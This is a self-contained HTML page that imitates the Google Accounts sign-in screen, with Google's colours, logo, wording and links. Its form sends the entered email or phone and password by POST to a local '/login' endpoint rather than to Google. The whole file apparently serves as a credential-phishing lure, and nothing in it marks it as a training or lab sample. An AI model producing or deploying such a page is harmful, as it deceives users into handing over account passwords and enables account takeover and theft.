<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-sizing: border-box;
        }
        .google-logo {
            width: 75px;
            margin-bottom: 10px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
            color: #202124;
        }
        p {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            margin-bottom: 20px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .forgot-link {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            display: block;
            text-align: left;
            margin-bottom: 40px;
            font-size: 14px;
        }
        .footer-buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }
        button:hover {
            background-color: #1669d6;
            box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }
        @media (max-width: 500px) {
            .login-box {
                border: none;
                width: 100%;
            }
        }
    </style>
</head>
<body>

<div class="login-box">
    <svg class="google-logo" viewBox="0 0 75 24" width="75"><path fill="#4285F4" d="M11.6,4.9v2.5h4c-0.3,1.4-1.6,3.3-4,3.3c-2.1,0-3.8-1.7-3.8-3.8c0-2.1,1.7-3.8,3.8-3.8c1.2,0,2,0.5,2.4,0.9l2-1.9C15,1.2,13.5,0.5,11.6,0.5C7.5,0.5,4.1,3.9,4.1,8c0,4.1,3.4,7.5,7.5,7.5c4.3,0,7.1-3,7.1-7.2c0-0.5-0.1-0.8-0.1-1.2L11.6,4.9L11.6,4.9z"/><path fill="#34A853" d="M22.9,0.5h-2.5v15h2.5V0.5z"/><path fill="#FBBC05" d="M30.6,6.4c-2.3,0-4.1,1.8-4.1,4.1s1.8,4.1,4.1,4.1s4.1-1.8,4.1-4.1S32.9,6.4,30.6,6.4z M30.6,12.7c-1.3,0-2.4-1.1-2.4-2.3s1.1-2.3,2.4-2.3s2.4,1.1,2.4,2.3S31.9,12.7,30.6,12.7z"/><path fill="#EA4335" d="M39.6,6.4c-2.3,0-4.1,1.8-4.1,4.1s1.8,4.1,4.1,4.1s4.1-1.8,4.1-4.1S41.9,6.4,39.6,6.4z M39.6,12.7c-1.3,0-2.4-1.1-2.4-2.3s1.1-2.3,2.4-2.3s2.4,1.1,2.4,2.3S40.9,12.7,39.6,12.7z"/><path fill="#4285F4" d="M49.6,6.4c-2.3,0-4.1,1.8-4.1,4.1s1.8,4.1,4.1,4.1c1.2,0,2.1-0.5,2.7-1.1v0.9c0,1.7-0.9,2.6-2.4,2.6c-1.2,0-2-0.9-2.3-1.6l-2.2,0.9c0.6,1.5,2.2,3.3,4.5,3.3c2.4,0,4.4-1.4,4.4-4.3V6.6h-2.3V7.5C51.8,6.9,50.8,6.4,49.6,6.4z M49.8,12.7c-1.3,0-2.4-1.1-2.4-2.3s1.1-2.3,2.4-2.3c1.3,0,2.4,1.1,2.4,2.3S51.1,12.7,49.8,12.7z"/><path fill="#34A853" d="M59.3,6.4c-2.3,0-4.1,1.8-4.1,4.1s1.8,4.1,4.1,4.1s4.1-1.8,4.1-4.1S61.6,6.4,59.3,6.4z M59.3,12.7c-1.3,0-2.4-1.1-2.4-2.3s1.1-2.3,2.4-2.3s2.4,1.1,2.4,2.3S60.6,12.7,59.3,12.7z"/></svg>
    
    <h1>Sign in</h1>
    <p>Use your Google Account</p>

    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Email or phone" required>
        <input type="password" name="password" placeholder="Enter your password" required>
        <a href="#" class="forgot-link">Forgot password?</a>
        
        <div class="footer-buttons">
            <a href="#" class="create-account">Create account</a>
            <button type="submit">Next</button>
        </div>
    </form>
</div>

</body>
</html>
